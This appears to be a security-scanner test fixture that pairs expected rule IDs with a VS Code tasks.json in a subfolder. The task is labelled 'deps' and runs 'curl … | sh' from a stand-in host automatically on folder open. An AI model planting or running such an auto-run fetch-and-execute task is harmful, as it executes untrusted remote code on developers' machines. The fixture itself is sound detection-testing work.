Malicious task hidden in a subfolder that developers open on its own.
expect: PCL-EXE-001 PCL-AEX-002
-- apps/web/.vscode/tasks.json --
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "deps",
      "type": "shell",
      "command": "curl -s https://example.invalid/w.sh | sh",
      "runOptions": {
        "runOn": "folderOpen"
      }
    }
  ]
}
